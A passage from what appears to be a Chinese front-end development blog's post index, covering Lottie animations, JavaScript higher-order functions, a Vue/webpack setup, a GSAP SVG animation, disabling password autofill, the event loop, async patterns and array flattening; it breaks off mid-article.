概述\n由于前端工程师不熟悉ae，动画师不熟悉前端知识，第一次可能不知道怎么整合，这里做个简单介绍。简言之就是用ae的插件[Bodymovin](https://www.adobeexchange.com/creativecloud.details.12557.html)导出动画的json数据，然后用[Lottie](http://airbnb.io/lottie/#/README)动画库在页面中调用。[源代码](https://github.com/jovysun/WOW)\n![动画示例图](2.gif)\n<!-- more -->\n\n# 详述\n\n## Bodymovin安装\n1. 方法一在Adobe插件中心下载安装[Bodymovin](https://www.adobeexchange.com/creativecloud.details.12557.html)\n2. 方法二直接下载源文件[bodymovin.zxp](https://github.com/airbnb/lottie-web/tree/master/build/extension)用[ZXP Installer](https://aescripts.com/learn/zxp-installer/)安装。\n\n详细步骤请参考[https://www.cnblogs.com/zamhown/p/6688369.html](https://www.cnblogs.com/zamhown/p/6688369.html)\n\n## web页面使用\n```html\n<div class=\"stage\"></div>\n<script src=\"lottie.min.js\"></script>\n<script>\nvar stage = document.querySelector('.stage');\nvar anim = lottie.loadAnimation({\n    container: stage,   //包含动画的DOM元素\n    renderer: 'svg',  // 'svg' / 'canvas' / 'html'\n    loop: false, //true / false / number\n    autoplay: true, //true / false\n    path: 'loading.json',   //动画的路径\n});\nanim.addEventListener('complete', function(){\n    console.log('complete:' + Date.now());\n    anim.destroy();\n})\n</script>\n```\n\n## 查看\n如果直接本地打开，应该看不了，会提示如下错误：\n![错误示例图](1.jpg)\n因此需要本地简单起个http服务才能查看，可以简单装个http-server。\n\n## 其他 \nlottie也支持Android, iOS, React Native, and Windows端使用，具体请移步[官方文档](http://airbnb.io/lottie/#/README)。\n","tags":["HTML"],"categories":["前端"]},{"title":"JavaScript高阶函数常用场景","url":"%2F2019-04-10-higher-order-function%2F","content":"\n# 概述\n\n数组有一维到多维，函数也有低阶到高阶，高阶函数的直观表现形式为一个函数接收另一个函数作为参数。\n\n<!-- more -->\n\n# 详述\n\n## 最简单的高阶函数示例\n\n```js\nfunction add(x, y, fn) {\n  return f(x) + f(y);\n}\n```\n\n## sort 排序\n\n数组的 sort 方法默认是按照字典排序，很多时候并不适合我们的实际需求，例如：\n\n```js\n[2, 10, 3].sort()[\n  // [10, 2, 3]\n\n  (\"Google\", \"apple\", \"Microsoft\")\n].sort();\n// ['Google', 'Microsoft', 'apple']\n```\n\n另外实际中也经常会涉及到按照对象的某个属性排序，这时候就需要我们自己创建比较函数，然后作为参数传给 sort 方法。例如：\n\n```js\n//示例一\n[2, 10, 3]\n  .sort((x, y) => {\n    return x - y;\n  })\n  [\n    // [2, 3, 10]\n\n    // 示例二\n    (\"Google\", \"apple\", \"Microsoft\")\n  ].sort(function(s1, s2) {\n    var x1 = s1.toUpperCase();\n    var x2 = s2.toUpperCase();\n    if (x1 < x2) {\n      return -1;\n    } else if (x1 > x2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  });\n// [\"apple\", \"Google\", \"Microsoft\"]\n\n// 示例三\nvar arr = [\n  {\n    id: 1,\n    name: \"Jack\"\n  },\n  {\n    id: 3,\n    name: \"Tom\"\n  },\n  {\n    id: 2,\n    name: \"Alax\"\n  }\n];\n\nfunction createComparisonFunction(propertyName) {\n  return function(object1, object2) {\n    var value1 = object1[propertyName];\n    var value2 = object2[propertyName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\narr.sort(createComparisonFunction(\"id\"));\n// [{id: 1, name: \"Jack\"}, {id: 2, name: \"Alax\"}, {id: 3, name: \"Tom\"}]\n```\n\n## map/reduce\n```js\nfunction pow(x) {\n    return x * x;\n}\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.map(pow); \n// [1, 4, 9, 16, 25, 36, 49, 64, 81]\n\n\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.map(String); \n// ['1', '2', '3', '4', '5', '6', '7', '8', '9']\n\n\nvar arr = [1, 3, 5, 7, 9];\narr.reduce(function (x, y) {\n    return x + y;\n}); \n// 25\n```\n\n## filter\n```js\n//例如，在一个Array中，删掉偶数，只保留奇数，可以这么写：\nvar arr = [1, 2, 4, 5, 6, 9, 10, 15];\nvar r = arr.filter(function (x) {\n    return x % 2 !== 0;\n});\nr; // [1, 5, 9, 15]\n\n\n//把一个Array中的空字符串删掉，可以这么写：\nvar arr = ['A', '', 'B', null, undefined, 'C', '  '];\nvar r = arr.filter(function (s) {\n    return s && s.trim(); // 注意：IE9以下的版本没有trim()方法\n});\nr; // ['A', 'B', 'C']\n\n\n//利用filter，可以巧妙地去除Array的重复元素：\nvar arr = ['apple', 'strawberry', 'banana', 'pear', 'apple', 'orange', 'orange', 'strawberry'];\nvar r = arr.filter(function (element, index, self) {\n    return self.indexOf(element) === index;\n});\nr; // [\"apple\", \"strawberry\", \"banana\", \"pear\", \"orange\"]\n//去除重复元素依靠的是indexOf总是返回第一个元素的位置，后续的重复元素位置与indexOf返回的位置不相等，因此被filter滤掉了。\n```\n# 参考\nhttp://www.cnblogs.com/goloving/p/8361705.html","tags":["JavaScript"],"categories":["前端"]},{"title":"从0搭建vue+webpack工程工作流","url":"%2F2019-04-04-vue-webpack-project%2F","content":"\n# 概述\n从实际出发，手动从零搭建一个vue开发工程。从基本依赖到工程工具到代码规范到生产打包，从不同功能层面逐步安装，并作对应说明。技术栈：vue2.x+webpack4.x+babel7.x。[完整代码](https://github.com/jovysun/vue-webpack-project)\n\n<!-- more -->\n\n# 详述\n## 初始化\n```shell\nnpm init\n```\n\n## 安装\n\n### 基本环境\n```shell\nnpm i vue vue-router vuex -S\n```\n```shell\nnpm i webpack webpack-cli vue-loader css-loader vue-style-loader vue-template-compiler -D\n```\n### 静态资源\n```shell\nnpm i url-loader file-loader -D\n```\n### scss预编译\n```shell\nnpm i sass-loader node-sass -D\n```\n### 开发server\n```shell\nnpm i webpack-dev-server html-webpack-plugin -D\n```\n### postcss\n```shell\nnpm i postcss-loader autoprefixer -D\n```\n\n### Babel 7.x\n```shell\n# 基本配置\nnpm i @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime @babel/runtime-corejs2 -D\n# .vue开发环境\nnpm i babel-plugin-transform-vue-jsx babel-helper-vue-jsx-merge-props babel-plugin-syntax-jsx babel-plugin-dynamic-import-webpack -D\n# webpack环境的loader\nnpm i babel-loader -D\n```\n\n### css分离\n```shell\nnpm i mini-css-extract-plugin -D\n```\n### 跨平台设置环境参数与删除文件工具\n```shell\nnpm i cross-env rimraf -D\n```\n### 前端gzip压缩\n```shell\nnpm i compression-webpack-plugin -D\n```\n\n\n## 代码规范\n\n### ESlint\n#### `.js`检测\n```shell\nnpm i eslint eslint-config-standard eslint-plugin-standard eslint-plugin-promise eslint-plugin-import eslint-plugin-node -D\n```\n#### `.vue`检测\n```shell\nnpm i eslint-plugin-vue -D\n```\n#### 根目录下创建`.eslintrc`文件，配置如下：\n```json\n{\n  \"extends\": [\n    \"standard\",\n    \"plugin:vue/recommended\"\n  ],\n  \"parserOptions\": {\n    \"parser\": \"babel-eslint\",\n    \"sourceType\": \"module\"\n  }\n}\n```\n#### `package.json`中添加执行检测命令和检测并自动修复命令\n```json\n\"scripts\": {\n  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",\n  \"lint\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\"\n}\n```\n#### 编码时检测\n`babel-eslint`用途是我们代码都是经过babel编译的，有些语法不是标准的eslint规范，因此需要指定parser为`babel-eslint`。\n```shell\nnpm i eslint-loader babel-eslint -D\n```\n`.eslintrc`文件修改如下\n```json\n{\n  \"extends\": [\n    \"standard\",\n    \"plugin:vue/recommended\"\n  ],\n  \"parserOptions\": {\n    \"parser\": \"babel-eslint\",\n    \"sourceType\": \"module\"\n  }\n}\n```\n配置`eslint-loader`\n```js\nrules: [\n  {\n    test: /\\.(vue|js|jsx)$/,\n    loader: 'eslint-loader',\n    exclude: /node_modules/,\n    enforce: 'pre' //预处理，在其他loader（如vue-loader）处理前先处理\n  }\n]\n```\n#### 忽略指定文件，例如忽略dist文件夹\n创建`.eslintignore`，配置如下\n```\ndist\n```\n\n### EditorConfig\n编辑器插件，让不同编辑器下编写代码用相同的规则处理。\n\n根目录创建`.editorconfig`文件，配置如下：\n```\nroot = true\n\n[*]\ncharset = utf-8\nend_of_line = 1f\nindent_size = 2\nindent_style = space\ninsert_final_newline = true\ntrim_trailing_whitespace = true\n```\n\n### precommit\ngit提交前进行eslint检测，保证不合规范的代码无法提交到远程库。注意，这是针对git提交，因此我们要先保证目录下已经完成git初始化（git init），会在.git文件夹下的hooks目录下生成各种文件。关于git钩子插件的更多介绍可以看[这里](https://www.jianshu.com/p/f0d31f92bfab)。\n\n```shell\nnpm i husky -D\n```\n`package.json`修改为：\n```json\n\"scripts\": {\n  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",\n  \"lint-fix\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\",\n  \"precommit\": \"npm run lint-fix\"\n}\n```\n\n# 后记","tags":["webpack"],"categories":["前端"]},{"title":"species-in-pieces网站动效的JS实现","url":"%2F2019-03-06-species-js%2F","content":"# 前言\n看到[species](http://species-in-pieces.com/)网站做的很炫，想要借鉴，发现主要是用css3的`clip-path`实现的，兼容不好，因此想着用js实现下。下面作简单介绍，需要详细代码见[github库](https://github.com/jovysun/species-JS)。\n# 概述\n效果图如下：\n![效果图](1.gif)\n<!-- more -->\n# 详述\n\n## 基础知识\n1. SVG基本知识，重点viewBox，polygon；\n2. GSAP动画平台，重点TimelineMax，TweenMax；\n3. parcel构建工具的基本使用，[parcel](http://www.css88.com/doc/parcel/)。\n## 实现思路\n根据参考网站的代码，动物图案是用`clip-path: polygon()`实现的，第一时间想到了SVG的polygon;另外对于转场动画，过渡动画，找个自己熟悉的动画库实现就行了。需要特别说明的是：\n1. css的clip-path用的用的百分比数值，svg的polygon的points值不能用百分比数值，知道viewBox概念的应该清楚，其实points的值也不是一般认为的绝对像素值，因此写了个工具函数`parsePolygonStr`。\n2. 因为图案是分动物和场景（树枝，石头等）两部分，并且希望先绘制动物再绘制场景，因此HTML部分用g标签分成`extra`和`anis`。\n## 主要的代码如下：\n### 入口文件HTML\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>species</title>\n</head>\n\n<body>\n    <div id=\"wrap\">\n        <svg class=\"stage\" viewBox=\"0 0 1000 700\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n            <g id=\"extra\">\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n            </g>\n            <g id=\"anis\">\n                \n            </g>\n        </svg>\n        <button id=\"go_btn\">GO!</button>\n        <h1 class=\"name\"></h1>\n        <h2 class=\"desc\"></h2>\n    </div>\n    <script src=\"./index.js\"></script>\n</body>\n\n</html>\n```\n### 主要js脚本\n```js\n// 导入一个 SCSS module\nimport '../css/main.scss';\n\nimport { data, preData } from './data'\n\nimport { TweenMax, TweenLite, TimelineMax } from 'gsap'\n\n// NodeList转换Array\nfunction NodeList2Array(nodelist) {\n    let arr = [];\n    if (nodelist.length) {\n        arr = Array.prototype.slice.call(nodelist, 0);\n    }\n    return arr;\n}\n// 把'clip-path'值转成svg polygon可用的值\nfunction parsePolygonStr(polygonStr, width, height) {\n    let pointsArr = polygonStr.split(/\\s+|,\\s/);\n    let newPointArr = pointsArr.map(function(currentVal, index, arr) {\n        if (index % 2 === 0) {\n            return (parseFloat(currentVal) * width / 100).toFixed(2);\n        } else {\n            return (parseFloat(currentVal) * height / 100).toFixed(2);\n        }\n    });\n\n    return newPointArr;\n}\n\n\n\nlet body = document.querySelector('body'),\n    wrap = document.querySelector('#wrap'),\n    name = wrap.querySelector('.name'),\n    desc = wrap.querySelector('.desc'),\n    stage = wrap.querySelector('.stage'),\n    anis = document.querySelector('#anis'),\n    extra = document.querySelector('#extra'),\n    goBtn = document.querySelector('#go_btn'),\n    anisPolygons = null,\n    extraPolygons = null;\n\n\nlet currentSpeciesIndex = 0,\n    width = 1000,\n    height = 700;\n\n\nfunction init() {\n    let initSpecies = preData.preload;\n    name.innerHTML = initSpecies.name;\n    desc.innerHTML = initSpecies.desc;\n    body.style.background = initSpecies.background;\n\n    let polygonArr = initSpecies.polygon;\n\n    if (Object.prototype.toString.call(polygonArr) === '[object Array]') {\n        let polygonHtml = '';\n\n        polygonArr.forEach(function(element, index) {\n            let pointsVal = parsePolygonStr(element[0], width, height);\n            polygonHtml += '<polygon points=\"' + pointsVal + '\" fill=\"' + element[1] + '\"/>';\n        });\n        anis.innerHTML = polygonHtml;\n\n    }\n}\ninit();\nanisPolygons = anis.querySelectorAll('polygon');\nextraPolygons = extra.querySelectorAll('polygon');\n\nlet tl = new TimelineMax({ delay: 0.2 });\n// 初始的loading动画\nNodeList2Array(anisPolygons).forEach(function(target, index) {\n    let tm = TweenMax.fromTo(target, 0.9, { attr: { fill: 'rgba(0, 0, 0, .7)' } }, { attr: { fill: 'rgba(200, 20, 20, .45)' }, ease: Power0.easeNone, repeat: -1, yoyo: true });\n    tl.add(tm, 0.9 - 0.03 * index);\n})\n\n// 模拟加载完成\nsetTimeout(function() {\n    // 清除tl\n    tl.clear();\n    // loading完之后的一系列动画\n    // 1，变色，放大，爆炸碎片\n    tl.add(\n            [\n                TweenMax.to('#anis polygon', .6, {\n                    attr: {\n                        fill: function(index) {\n                            let fillVal = '#111';\n                            if (index % 5 === 0) {\n                                fillVal = '#28282a';\n                            } else if (index % 5 === 1) {\n                                fillVal = '#111';\n                            } else if (index % 5 === 2) {\n                                fillVal = '#333';\n                            } else if (index % 5 === 3) {\n                                fillVal = '#222';\n                            } else if (index % 5 === 4) {\n                                fillVal = '#121212';\n                            }\n                            return fillVal;\n                        }\n                    }\n                }),\n                TweenMax.to('#wrap .stage', .6, {\n                    scale: 1,\n                    ease: Back.easeOut.config(1.7)\n                }),\n                TweenMax.to('#anis polygon', .6, {\n\n                    attr: {\n                        points: function(index, target) {\n                            let nextSpeciesPolygon = preData.ready.polygon;\n                            // debugger\n                            return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                        },\n                        fill: function(index, target) {\n                            let nextSpeciesPolygon = preData.ready.polygon;\n                            return nextSpeciesPolygon[index][1];\n                        },\n                    }\n                    // ease: Power2.easeInOut,\n\n                })\n            ]\n        )\n        // 2，海豚\n        .add(\n            TweenLite.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.preAni.polygon;\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.preAni.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                },\n                // ease: Power2.easeInOut,\n            })\n        )\n        // 3，爆炸碎片\n        .add(\n            TweenMax.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.ready.polygon;\n                        // debugger\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.ready.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                }\n            }),\n            '+=0.4'\n        )\n        // 4，“piece”logo\n        .add(\n            TweenMax.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.title.polygon;\n                        // debugger\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.title.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                }\n            }),\n            '+=0.4'\n        );\n\n}, 3000);\n\n\n\n// 动物图案切换\nfunction playHandler() {\n    let nextSpecies = data[currentSpeciesIndex++];\n    if (!nextSpecies) {\n        return false;\n    }\n\n    name.innerHTML = nextSpecies.name;\n    desc.innerHTML = nextSpecies.desc;\n    body.style.background = nextSpecies.background;\n\n    let nextSpeciesPolygon = nextSpecies.polygon;\n\n    let subTl = new TimelineMax({ pause: true });\n\n    let arr1 = NodeList2Array(anisPolygons);\n    let arr2 = NodeList2Array(extraPolygons);\n\n    // 之所以没用TweenMax.staggerTo是因为属性对象中没法用获得index，如下实现不了\n    // attr: {\n    //     points: pointVal.join(' '),\n    //     fill: function(index){return nextSpeciesPolygon[index][1];}\n    // }\n\n    arr1.concat(arr2).forEach(function(target, index) {\n        let pointVal = parsePolygonStr(nextSpeciesPolygon[index][0], width, height),\n            fillVal = nextSpeciesPolygon[index][1];\n        subTl.add(\n            TweenMax.to(target, 0.5, {\n                attr: {\n                    points: pointVal.join(' '),\n                    fill: fillVal\n                },\n                ease: Back.easeOut.config(1.7)\n            }),\n            '-=0.47'\n        )\n    });\n\n    subTl.play();\n\n\n}\n\ngoBtn.addEventListener('click', playHandler, false);\n```\n# 后记\n[GSAP动画平台](https://greensock.com/gsap)真的很强大，推荐有交互动效方面需求的可以关注下。","tags":["动效"],"categories":["前端"]},{"title":"禁止浏览器自动填充账号密码","url":"%2F2019-03-05-%E7%A6%81%E6%AD%A2%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E5%A1%AB%E5%85%85%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%2F","content":"# 前言\n对于禁用表单自动填充，HTML5标准语法是在form或者input元素上加`autocomplete=\"off\"`，实践发现有些兼容问题。\n\n# 概述\n一般来讲对于浏览器自动填充表单的账号密码是不需要处理的，但是当登录可以用email+password或者phone+password就得处理了，实践发现用email注册登录后，下次再phone登录页面会自动填充email账号。\n<!-- more -->\n# 详述\nemail登录页自动填充，体验是没有问题的，如图：\n![email+password](1.jpg)\n\n但是切换到phone登录页自动填充，体验就不好了，phone输入框自动填上了email，如图：\n![phone+password](2.jpg)\n\n对于这种情况怎么处理呢，最简单的方式就是禁用自动填充，如图：\n![phone+password](3.jpg)\n\n但是对于chrome浏览器，当你授权记住登录密码的，这种有登录密码的页面，直接加`autocomplete=\"off\"`是无效的，浏览器还是会强行填充账号密码。\n\n怎么处理呢？\n\n在password元素上加`autocomplete=\"new-password\"`就可以了。\n```js\n<input placeholder=\"Password\" type=\"password\" name=\"password\" tabindex=\"2\" autocomplete=\"new-password\">\n```\n\n# 后记\n以上处理方式也只是简单的优化下体验，对于各种浏览器，可能各家对于允许记住密码的自动填充策略各不相同，因此如果觉得只需要体验改善，没必要下大功夫处理的，这样就好了。如果非得处理，也可以再加个隐藏的password元素给自动配对，而显示另一个，或者用js处理等方式。","tags":["HTML"],"categories":["前端"]},{"title":"JavaScript的事件循环（Event Loop）","url":"%2F2019-03-04-JavaScript%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%EF%BC%88Event-Loop%EF%BC%89%2F","content":"# 前言\n对于事件循环，这次将从浏览器端和node端分别讲解。\n# 概述\nJavaScript是一门单线程非阻塞的脚本语言。对于单线程，主要是因为当初这么语言设计的时候也是为了操作DOM，如果多线程就无法保证操作的顺序性。那么既然单线程了，为什么会非阻塞呢？这是因为事件循环的机制，这个机制处理了我们熟悉的浏览器端的异步事件回调。当然node是基于js的，也有自己的事件循环机制。\n<!-- more -->\n# 详述\n## 浏览器端\n浏览器端js是有专门的JS引擎来执行的，在执行JS的主线程中，遇到异步事件，会把回调函数放到执行栈中，直到主线程同步代码执行完，然后开始从执行栈中依次执行添加的回调函数。\n那么这个异步任务有没有优先级呢？\n有。这就是大家常说的宏任务（macro task）与微任务（micro task）。常见的如下：\n宏任务：\n```js\n    setInterval()\n    setTimeout()\n```    \n微任务\n```js\n    new Promise()\n    new MutaionObserver()\n```\n其中微任务优先级高于宏任务，也就是先执行，可以帮上面说的执行栈再细分为微任务执行栈和宏任务执行栈。\n\n## node端\nnode端的事件循环模型官方给出如下示例图：\n![node事件循环](1.jpg)\n\n具体各阶段任务为：\n\ntimers: 这个阶段执行定时器队列中的回调如 setTimeout() 和 setInterval()。\nI/O callbacks: 这个阶段执行几乎所有的回调。但是不包括close事件，定时器和setImmediate()的回调。\nidle, prepare: 这个阶段仅在内部使用，可以不必理会。\npoll: 等待新的I/O事件，node在一些特殊情况下会阻塞在这里。\ncheck: setImmediate()的回调会在这个阶段执行。\nclose callbacks: 例如socket.on('close', ...)这种close事件的回调。\n\n总的循环顺序为：\n首先是添加异步任务回调到poll中\n=>执行完之后到check阶段，主要执行setImmediate()\n=>然后执行close callbacks，主要是socket的close之类的回调\n=>然后到timer阶段，主要是setTimeout() 和 setInterval()回调\n=>I/O callbacks，执行除了模型中列出的阶段回调之外所有的\n=>idle, prepare，内部清理，准备下次循环。\n\n# 后记\n参考：https://www.cnblogs.com/cangqinglang/p/8967268.html","tags":["JavaScript"],"categories":["前端"]},{"title":"异步之回调,promise,async/await","url":"%2F2019-03-02-%E5%BC%82%E6%AD%A5%E4%B9%8B%E5%9B%9E%E8%B0%83-promise-async-await%2F","content":"# 前言\n场景：点击按钮下载商品数据。涉及到异步账户检查，首先有没有登录，如果登录了，再检查是否是合法用户，\b如果是合法的那么继续下面操作。\n# 概述\n在JavaScript中处理异步请求是用的回调函数，对于需要顺序处理异步请求的，就得一层层嵌套回调，层数多了就很难维护了，就是大家说的“回调地狱”，怎么才能像同步代码那样优雅的写呢？这就是ES6的promise及ES7的async/await要解决的问题。\n<!-- more -->\n# 详述\n\n## 示例一：回调函数\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\nfunction exportData() {\n    // 模拟ajax检查是否登录\n    setTimeout(() => {\n        let response = {\n            code: '10001',\n            data: {\n                param1: '12345'\n            }\n        };\n        console.log('检查登录请求完成：' + response);\n        // 模拟若已经登录了，再检查是否为合法的用户\n        if (response.code === '10001') {\n            setTimeout(() => {\n                let response2 = {\n                    code: '10001',\n                    data: {\n                        param2: 'abcde'\n                    }\n                };\n                console.log('检查合法请求完成：' + response2);\n                if (response2.code === '10001') {\n                    console.log('callback');\n                    doExportData(response.data.param1, response2.data.param2);\n                }\n\n            }, 500)\n        }\n\n    }, 500)\n}\nexportData();\n// 执行结果\n// 检查登录请求完成：[object Object]\n// 检查合法请求完成：[object Object]\n// callback\n// [export data]param:\"12345\"\n```\n## 示例二：Promise\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\n\nlet myPromise = new Promise((resolve, reject) => {\n    // 模拟异步请求返回数据\n    setTimeout(() => {\n        let response = {\n            code: '10001',\n            data: {\n                param1: '12345'\n            }\n        };\n        if (response.code === '10001') {\n            resolve(response.data.param1);\n        }\n\n    }, 500)\n});\nmyPromise.then((param1) => {\n    return new Promise((resolve, reject) => {\n        // 模拟异步请求返回数据\n        setTimeout(() => {\n            let response2 = {\n                code: '10001',\n                data: {\n                    param2: 'abcde'\n                }\n            };\n            if (response2.code === '10001') {\n                resolve({ param1: param1, param2: response2.data.param2 });\n            }\n\n        }, 500)\n    })\n}).then((data) => {\n    console.log('promise');\n    doExportData(data.param1, data.param2);\n})\n\n\n// promise\n// [export data]param:\"12345\"\n```\n\n## 示例三：async await\n\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\nfunction ajax1() {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            let response = {\n                code: '10001',\n                data: {\n                    param: '12345'\n                }\n            };\n            // let response = {\n            //     code: '10002',\n            //     data: {\n            //         param: 'ajax1 error'\n            //     }\n            // };\n            if (response.code === '10001') {\n                resolve(response.data);\n            } else {\n                reject(response.data);\n            }\n\n        }, 500)\n    })\n\n}\n\nfunction ajax2(data1) {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            let response = {\n                code: '10001',\n                data: {\n                    param: 'abcde'\n                }\n            };\n            // let response = {\n            //     code: '10002',\n            //     data: {\n            //         param: 'ajax2 error'\n            //     }\n            // };\n            if (response.code === '10001') {\n                resolve({ param1: data1.param, param2: response.data.param });\n            } else {\n                reject(response.data);\n            }\n        }, 500)\n    })\n\n}\n\nasync function exportData(params) {\n    try {\n        let data1 = await ajax1();\n        let data = await ajax2(data1);\n        console.log('async await');\n        doExportData(data);\n    } catch (error) {\n        console.log(error);\n    }\n\n}\nexportData();\n\n// async await\n// [export data]param:{\"param1\":\"12345\",\"param2\":\"abcde\"}\n```\n\n其实async await只是promise的魔法糖，例如示例三可调整为如下：\n```js\nlet myPromise = ajax1();\nmyPromise.then((data1) => {\n    return ajax2(data1);\n}).then((data) => {\n    console.log('promise');\n    doExportData(data);\n})\n\n// promise\n// [export data]param:{\"param1\":\"12345\",\"param2\":\"abcde\"}\n```\n\n# 后记\n其实promise也只是对回调函数进行的包装，通过观察者模式实现形式上的同步代码，需要深入研究的请参阅[Promise原理与实现](https://www.jianshu.com/p/b4f0425b22a1)。","tags":["JavaScript"],"categories":["前端"]},{"title":"数组扁平化","url":"%2F2019-03-01-%E6%95%B0%E7%BB%84%E6%89%81%E5%B9%B3%E5%8C%96%2F","content":"# 前言\n题目：将[1,2,[3,[4,5]]]转化成[1,2,3,4,5]。\n# 概述\n二维数组与多维数组都有哪些方法。\n<!-- more -->\n# 详述\n## 递归（通用）\n```js\nvar arr = [1, 2, [3, [4, 5]]];\n \nfunction flatten(arr) {\n\tvar res = [];\n\tfor(var i = 0; i < arr.length; i++) {\n\t\tif(Array.isArray(arr[i])) {\n\t\t\tres = res.concat(flatten(arr[i]));\n\t\t} else {\n\t\t\tres.push(arr[i]);\n\t\t}\n\t}\n\treturn res;\n}\n \nvar result = flatten(arr);\nconsole.log(result);\n```\n## 简单二维\n```js\nconst arr = [11, [22, 33], [44, 55], 66];\nconst flatArr = arr.join().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]\n\n\nconst arr = [11, [22, 33], [44, 55], 66];\nconst flatArr = arr.toString().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]\n```\n## flat()方法（兼容问题）\n```js\n[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n```\n# 后记\n参考：https://www.cnblogs.com/mengfangui/p/9485703.html","tags":["JavaScript"],"categories":["前端"]},{"title":"（转）理解这12个概念，让你的JavaScript开发更上一层楼","url":"%2FJavaScript-12%2F","content":"\n\n# 概述\nJavaScript 是一门复杂的语言。如果你是一名 JavaScript 开发人员，不管处于什么样的水平，都有必要了解 JavaScript 的基本概念。本文介绍了 12 个非常重要的 JavaScript 概念，但绝对不是说 JavaScript 开发人员只需要知道这些就可以了。\n<!-- more -->\n\n# 详述\n## 1. 变量赋值（值与引用）\nJavaScript 总是按照值来给变量赋值。当指定的值是 JavaScript 的五种原始类型之一（即 Boolean、null、undefined、String 和 Number）时，将为变量分配实际的值。但是，当指定的值是 Array、Function 或 Object 时，将为变量分配内存的对象引用。\n\n在下面的代码段中，使用 var1 对 var2 赋值。由于 var1 是基本类型（String），因此 var2 的值等于 var1 的 String 值，但这个时候可以认为 var2 与 var1 完全不同。因此，重新为 var2 赋值对 var1 没有任何影响。\n\n```js\nlet var1 = 'My string';\nlet var2 = var1;\nvar2 = 'My new string';\nconsole.log(var1);\n// 'My string'\nconsole.log(var2);\n// 'My new string'\n```\n\n我们将它与对象赋值进行比较。\n\n```js\nlet var1 = { name: 'Jim' }\nlet var2 = var1;\nvar2.name = 'John';\nconsole.log(var1);\n// { name: 'John' }\nconsole.log(var2);\n// { name: 'John' }\n```\n如果你期望它会像原始类型赋值那样，很可能会出问题！如果你创建了一个无意中会改变对象的函数，就会出现一些非预期的行为。\n\n## 2. 闭包\n闭包是一种重要的 JavaScript 模式，可用于访问私有变量。在下面的示例中，createGreeter 返回一个匿名函数，这个函数可以访问参数 greeting（在这里是“Hello”）。在后续的调用中，sayHello 将有权访问这个 greeting！\n```js\nfunction createGreeter(greeting) {\n  return function(name) {\n    console.log(greeting + ', ' + name);\n  }\n}\nconst sayHello = createGreeter('Hello');\nsayHello('Joe');\n// Hello, Joe\n```\n在一个更真实的场景中，你可以设想一个初始化函数 apiConnect(apiKey)，它返回一些使用 API密钥的方法。在这种情况下，只需要提供一次 apiKey 即可。\n```js\nfunction apiConnect(apiKey) {\n  function get(route) {\n    return fetch(`${route}?key=${apiKey}`);\n  }\n  function post(route, params) {\n    return fetch(route, {\n      method: 'POST',\n      body: JSON.stringify(params),\n        headers: {\n          'Authorization': `Bearer ${apiKey}`\n        }\n      })\n  }\n  return { get, post }\n}\nconst api = apiConnect('my-secret-key');\n// No need to include the apiKey anymore\napi.get('http://www.example.com/get-endpoint');\napi.post('http://www.example.com/post-endpoint', { name: 'Joe' });\n```\n## 3. 解构\nJavaScript 参数解构是一种从对象中提取属性的常用方法。\n```js\nconst obj = {\n  name: 'Joe',\n  food: 'cake'\n}\nconst { name, food } = obj;\nconsole.log(name, food);\n// 'Joe' 'cake'\n```\n如果需要以其他名称来提取属性，可以使用以下格式来指定它们。\n```js\nconst obj = {\n  name: 'Joe',\n  food: 'cake'\n}\nconst { name: myName, food: myFood } = 